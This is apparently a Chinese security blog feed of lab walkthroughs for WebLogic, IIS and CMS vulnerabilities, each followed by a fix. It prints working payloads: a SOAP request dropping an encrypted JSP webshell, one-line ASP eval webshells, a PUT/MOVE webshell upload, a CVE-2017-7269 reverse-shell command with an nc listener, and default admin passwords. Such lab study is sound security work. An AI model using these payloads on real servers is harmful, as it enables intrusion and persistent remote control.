        <content type="html"><![CDATA[<h1 id="XMLDecoder反序列化漏洞-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞(CVE-2017-3506)"></a>XMLDecoder反序列化漏洞(CVE-2017-3506)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>WebLogic 反序列化漏洞CVE-2017-3248和WebLogic WLS LS组件的远程代码执行漏洞CVE-2017-<br>10271，Oracle官方在2017年10月份发布了该漏洞的补丁，但没有公开漏洞细节，如果企业未及时安装<br>补丁，存在被攻击的风险。对企业服务器发起了大范围远程攻击，对大量企业的服务器造成了严重威<br>胁，受影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>环境weblogic的版本为10.3.6</p><p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zgiicr.png" alt="0"></p><p>发送post包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/hAccept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;</span><br><span class="line">Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1228</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.js</span><br><span class="line">p&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U</span><br><span class="line">extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return</span><br><span class="line">super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))</span><br><span class="line">&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher</span><br><span class="line">c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new</span><br><span class="line">U(this.getClass().getClassLoader()).g(c.doFinal(new</span><br><span class="line">sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta</span><br><span class="line">nce().equals(pageContext);&#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>访问网址 密码 rebeyond</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/bea_wls_internal/test.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zgnnol.png" alt="1"></p><h2 id="3-修复方案"><a href="#3-修复方案" class="headerlink" title="3.修复方案"></a>3.修复方案</h2><p>更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制 ,或者根据业务所有需求，考虑<br>是否删除WLS-WebServices组件。包含此组件路径为：</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wlswsat</p><p>Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wlswsat.war</p><p>Middleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.war</p><p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-w">http://weblogic_ip/wls-w</a><br>sat&#x2F; 是否为404页面。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic弱口令getshell漏洞</title>
      <link href="/archives/c1b8f454.html"/>
      <url>/archives/c1b8f454.html</url>
      
        <content type="html"><![CDATA[<h1 id="weblogic-弱口令getshell漏洞"><a href="#weblogic-弱口令getshell漏洞" class="headerlink" title="weblogic 弱口令getshell漏洞"></a>weblogic 弱口令getshell漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>在weblogic搭建好之后没有修改进入后台的密码 导致弱口令登录获得webshell</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>访问 登录页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure><p>使用默认密码进行登录，如果登录不上使用字段进行穷举 weblogic常用弱口令： <a href="http://cirt.net/passw">http://cirt.net/passw</a><br>ords?criteria&#x3D;weblogic</p><p>错误密码5次之后就会自动锁定，这里使用weblogic&#x2F;Oracle@123登陆后台<br><img src="https://pic.888888.al/i/2023/08/15/zdjgv6.png" alt="0"></p><p>登录后台后 点击部署 点击安装 点击上传文件<br><img src="https://pic.888888.al/i/2023/08/15/ze88pg.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf aaa.war .</span><br></pre></td></tr></table></figure><p>打包后门war文件 上传即可<br><img src="https://pic.888888.al/i/2023/08/15/zee8x3.png" alt="2"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/08/15/zes3z3.png" alt="3"></p><p>点击下一步<br><img src="https://pic.888888.al/i/2023/08/15/zewad4.png" alt="4"></p><p>点击完成 来到这个页面<br><img src="https://pic.888888.al/i/2023/08/15/zf0ir8.png" alt="5"></p><p>访问网站网址即可获取webshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/z/shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/zfgkmx.png" alt="6"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p><strong>1.设置强口令</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS7文件解析漏洞</title>
      <link href="/archives/5f0a23e4.html"/>
      <url>/archives/5f0a23e4.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png<br>解析为php文件</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>上传图片到网站允许目录 在图片上加上&#x2F;.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.148:8980/1.jpg/.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/yz8sa6.png" alt="0"></p><h2 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h2><p>1.配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p><p>2.编辑映射模块-&gt;映射-&gt;打勾<br><img src="https://pic.888888.al/i/2023/08/15/yzds66.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS RCE-CVE-2017-7269</title>
      <link href="/archives/812b5b48.html"/>
      <url>/archives/812b5b48.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的<br>ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 <strong>If:&lt;http:&#x2F;&#x2F;</strong> 开头的长标头执行任<br>意代码 PROPFIND请求</p><h2 id="2-影响范围"><a href="#2-影响范围" class="headerlink" title="2.影响范围"></a>2.影响范围</h2><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><h2 id="3-复现"><a href="#3-复现" class="headerlink" title="3.复现"></a>3.复现</h2><p>POC地址:<a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">115</span> <span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">154</span> <span class="number">9999</span></span><br><span class="line">nc -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z0ncd5.png" alt="0"></p><h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h2><p><strong>1.关闭 WebDav服务</strong></p><p><strong>2.升级</strong></p><p><strong>3.部署安全设备</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS短文件名漏洞</title>
      <link href="/archives/c8c55640.html"/>
      <url>/archives/c8c55640.html</url>
      
        <content type="html"><![CDATA[<h1 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位<br>Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短文件名的效果。<br><img src="https://pic.888888.al/i/2023/08/15/z2ycfo.png" alt="0"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p><p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六<br>种<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>提醒一下 IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;&#x3D;8.0版本,即使没有安装ASP.NET，通过<br>OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现<br><img src="https://pic.888888.al/i/2023/08/15/z34ssl.png" alt="1"></p><p><strong>短文件名特征：</strong><br>1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的<br>6个字符是相同的,后面的数字进行递增<br><img src="https://pic.888888.al/i/2023/08/15/z3jy2l.png" alt="2"></p><p>2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<br><img src="https://pic.888888.al/i/2023/08/15/z43vmq.png" alt="3"></p><p>3.所有小写字母均转换成大写的字母</p><p>4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<br><img src="https://pic.888888.al/i/2023/08/15/z48fch.png" alt="4"></p><p>5.长文件名前缀&#x2F;文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包<br>含空格或者其他部分特殊字符,不论长度均会生成短文件。<br><img src="https://pic.888888.al/i/2023/08/15/z4mx6e.png" alt="5"><br>.</p><p>.</p><p>使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名<br>注：* 可以匹配n个字符, n可以为0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><strong>通过浏览器访问一个存在的短文件名，会返回404状态码, 404说明该文件存在</strong><br><img src="https://pic.888888.al/i/2023/08/15/z5hs0g.png" alt="6"><br><strong>通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在</strong><br><img src="https://pic.888888.al/i/2023/08/15/z4utmy.png" alt="7"></p><p>通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞</p><p>判断漏洞存在后,接下来手工详细分析猜解IIS短文件名</p><p>在网站目录下新建一个 abcde1231111.txt文件,分别访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/a*~1*/a.aspx</span><br><span class="line"></span><br><span class="line">http://upload.moonteam.com/b*~1*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z6ghu4.png" alt="8"><br><img src="https://pic.888888.al/i/2023/08/15/z6k1hb.png" alt="9"><br>通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。</p><p>通过上面的方法接着往后猜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1*/a.aspx</span><br></pre></td></tr></table></figure><p>到这文件名已经出来了，接着就是判断是目录还是文件。</p><p><img src="https://pic.888888.al/i/2023/08/15/z6odsm.png" alt="10"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1/a.aspx</span><br><span class="line"></span><br><span class="line">````</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![11](https://pic.888888.al/i/2023/08/15/z7phjg.png)</span><br><span class="line">判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```asp</span><br><span class="line">http://upload.moonteam.com/abcde*~1.a*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z8vxft.png" alt="12"><br>.</p><p>.</p><p>.</p><p>第一个是字符是t开头的，接着往后测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.t*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z90b4e.png" alt="13"><br>.</p><p>.</p><p>.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://upload.moonteam.com/abcde*~1.txt*/a.aspx</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z9f8xj.png" alt="14"></p><p>按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解<br>abcde1231111.txt文件名</p><p>.</p><p><strong>使用IIS短文件名扫描软件，获取目标存在哪些短文件名</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis_shortname_Scan.py http://upload.moonteam.com/</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/z9lo7o.png" alt="15"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、升级.net framework</p><p>2、修改注册表键值：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<br>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p><p>命令行关闭 fsutil behavior set disable8dot3 1</p><p>新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。<br><img src="https://pic.888888.al/i/2023/08/15/z9yj6p.png" alt="16"><br>**注:**此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消<br>失。如果不重新复制，已经存在的短文件名则是不会消失的。</p><p>将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到<br>c:\www。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS文件解析漏洞</title>
      <link href="/archives/e735aa4d.html"/>
      <url>/archives/e735aa4d.html</url>
      
        <content type="html"><![CDATA[<h1 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h1><h2 id="1-基于文件名"><a href="#1-基于文件名" class="headerlink" title="1 基于文件名"></a>1 基于文件名</h2><h3 id="1-1原理"><a href="#1-1原理" class="headerlink" title="1.1原理"></a>1.1原理</h3><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 <strong>;</strong> 号及其后面的内容，相当于截断。</p><p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p><p><strong>iis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件</strong></p><p><strong>C:\WINDOWS\system32\inetsrv\asp.dll 所以都解析成asp</strong><br><img src="https://pic.888888.al/i/2023/08/15/z1p221.png" alt="0"></p><h3 id="1-2复现"><a href="#1-2复现" class="headerlink" title="1.2复现"></a>1.2复现</h3><p>通过文件上传，或者创建文件，格式为*.asp;.jpg<br><img src="https://pic.888888.al/i/2023/08/15/z1thtx.png" alt="1"></p><h3 id="1-3防御"><a href="#1-3防御" class="headerlink" title="1.3防御"></a>1.3防御</h3><p><strong>1.禁止创建和上传此类畸形文件</strong></p><p><strong>2.图片存放目录设置成禁止脚本文件执行</strong></p><p><strong>3.升级iis版本</strong></p><h2 id="2-基于文件夹"><a href="#2-基于文件夹" class="headerlink" title="2 基于文件夹"></a>2 基于文件夹</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>该版本默认将 *.asp&#x2F; 目录下的所有文件当成Asp解析。</p><h3 id="2-2复现"><a href="#2-2复现" class="headerlink" title="2.2复现"></a>2.2复现</h3><p>创建文件.asp文件夹 上传图片格式后门到此目录<br><img src="https://pic.888888.al/i/2023/08/15/z2927b.png" alt="2"></p><h3 id="2-3防御"><a href="#2-3防御" class="headerlink" title="2.3防御"></a>2.3防御</h3><p><strong>1.禁止创建此类文件夹</strong></p><p><strong>3.升级iis版本</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS任意文件写入漏洞</title>
      <link href="/archives/1f4414ad.html"/>
      <url>/archives/1f4414ad.html</url>
      
        <content type="html"><![CDATA[<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV,配置了可以写入的权限，造成任意文件上传。<br>版本：IIS 6.0</p><h2 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h2><p>Ⅰ 开启 WebDAV 和写权限<br><img src="https://pic.888888.al/i/2023/08/15/yurpo5.png" alt="0"><br><img src="https://pic.888888.al/i/2023/08/15/yvsx06.png" alt="1"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用burpsuite 提交OPTIONS 查看支持的协议。<br><img src="https://pic.888888.al/i/2023/08/15/yw91o0.png" alt="2"></p><p>使用PUT请求，创建一个.txt的文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Content-Length: <span class="number">25</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>使用MOVE请求，将.txt的文件改为.asp文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MOVE /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: upload.moonteam.com</span><br><span class="line">Destination: http:<span class="comment">//upload.moonteam.com/shell.asp</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/ywviuf.png" alt="3"></p><p>shell.asp写入成功。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>1.关闭webdav</strong><br><strong>2.关闭写入权限</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aspcms拿webshell</title>
      <link href="/archives/d8c67745.html"/>
      <url>/archives/d8c67745.html</url>
      
        <content type="html"><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>网站中的配置文件，如果可在后台里进行修改，如果没有任何过滤，可以在里面写入而已的语句，即可<br>获取webshell。</p><p><strong>注</strong>：注意闭合问题，因为配置文件在网站中是全局调用，如果写错，网站会错误。无法访问。<br>在aspcms可以修改 如果是字符类型填写双引号闭合 如果是数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br><span class="line"><span class="string">%&gt;&lt;%eval request(chr(35))%&gt;&lt;%</span></span><br></pre></td></tr></table></figure><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>一样的，通过弱口令进入到后台。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/08/15/xozg6o.jpg" alt="0"></p><h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>点击<strong>拓展功能-&gt;幻灯片管理</strong>，打开<strong>burpsuit</strong>进行抓包。<br><img src="https://pic.888888.al/i/2023/08/15/xqupdr.jpg" alt="1"><br>在<strong>slidestyle</strong>的后面写入一句话木马，注意闭合问题，并进行URL-encode。<br><img src="https://pic.888888.al/i/2023/08/15/xr7s2d.jpg" alt="2"><br>放包，用蚁剑尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/08/15/xraa7q.jpg" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms后台拿webshell</title>
      <link href="/archives/226c5523.html"/>
      <url>/archives/226c5523.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>我们用弱口令爆破，将账号和密码穷举出来。<br>账号：admin 密码：123456<br><img src="https://pic.888888.al/i/2023/08/15/xib4qz.jpg" alt="0"></p><h2 id="方法一：文件上传"><a href="#方法一：文件上传" class="headerlink" title="方法一：文件上传"></a>方法一：文件上传</h2><p>我们进入到<strong>核心-&gt;文件上传</strong>这个位置，直接上传带有木马的文件。<br><img src="https://pic.888888.al/i/2023/08/15/xie1f8.jpg" alt="1"><br><strong>上传成功!</strong><br><img src="https://pic.888888.al/i/2023/08/15/xigtsd.jpg" alt="2"></p><h2 id="方法二：修改模块文件"><a href="#方法二：修改模块文件" class="headerlink" title="方法二：修改模块文件"></a>方法二：修改模块文件</h2><p>进入<strong>模板-&gt;index.html</strong>，点击修改。<br><img src="https://pic.888888.al/i/2023/08/15/xiv4sz.jpg" alt="3"><br>加入我们的payload。<br><img src="https://pic.888888.al/i/2023/08/15/xiyr0f.jpg" alt="4"><br>修改成功后，我们到生成这个界面，将主页位置中文件的后缀改为.php，然后更新主页。<br><img src="https://pic.888888.al/i/2023/08/15/xj2gcr.jpg" alt="5"><br>点击游览，上传成功！<br><img src="https://pic.888888.al/i/2023/08/15/xks2vx.jpg" alt="6"></p><h2 id="方法三：后台任意命令执行"><a href="#方法三：后台任意命令执行" class="headerlink" title="方法三：后台任意命令执行"></a>方法三：后台任意命令执行</h2><p>在dedecms后台广告管理，可以插入php任意代码。<br><img src="https://pic.888888.al/i/2023/08/15/xkwcgk.jpg" alt="7"></p><p>点击增加一个广告位，在广告内容写入payload。<br><img src="https://pic.888888.al/i/2023/08/15/xl7skm.jpg" alt="8"></p><p>用中国菜刀尝试连接，连接成功。<br><img src="https://pic.888888.al/i/2023/08/15/xla3mk.jpg" alt="9"><br><img src="https://pic.888888.al/i/2023/08/15/xldxzz.jpg" alt="10"></p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress后台拿webshell</title>
      <link href="/archives/0.html"/>
      <url>/archives/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>首先我们通过弱口令爆破拿到wordpress的账号和密码。</p><p>账号：admin 密码：123456</p><p><img src="https://pic.888888.al/i/2023/08/15/xmi2lm.jpg" alt="1"></p><h2 id="方法一：模板编辑"><a href="#方法一：模板编辑" class="headerlink" title="方法一：模板编辑"></a>方法一：模板编辑</h2><p>我们到外观-&gt;编辑这个模块，选择404模板，在404.php中写入php一句话木马。</p><p>点击更新文件<br><img src="https://pic.888888.al/i/2023/08/15/xmnjje.jpg" alt="2"></p><p>我们可以看到在服务器后台的404.php文件中确实被我们写入了一句话木马了。<br><img src="https://pic.888888.al/i/2023/08/15/xmqqj4.jpg" alt="3"></p><p>我们妨问404.php并且用蚁剑尝试连接。<br><img src="https://pic.888888.al/i/2023/08/15/xn7zq3.jpg" alt="4"><br>连接成功！<br><img src="https://pic.888888.al/i/2023/08/15/xnakad.jpg" alt="5"></p><h2 id="方法二：上传主题"><a href="#方法二：上传主题" class="headerlink" title="方法二：上传主题"></a>方法二：上传主题</h2><p>我们进入到外观-&gt;主题界面，将带有木马的文件写入主题中，再上传上去。<br><img src="https://pic.888888.al/i/2023/08/15/xnm31o.jpg" alt="6"></p><p>点击上传<br><img src="https://pic.888888.al/i/2023/08/15/xno7st.jpg" alt="7"><br>妨问这个主题中带有木马的文件<br><img src="https://pic.888888.al/i/2023/08/15/xnqbfs.jpg" alt="8"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>模板编辑拿webshell</strong></p><p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。<br><strong>文件上传拿webshell</strong></p><p>通过后台的上传模块，上传网页后门，就可以拿到webshell。</p>]]></content>
      
      
      <categories>
          
          <category> webshell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之SQL</title>
      <link href="/archives/c4c569e3.html"/>
      <url>/archives/c4c569e3.html</url>
      
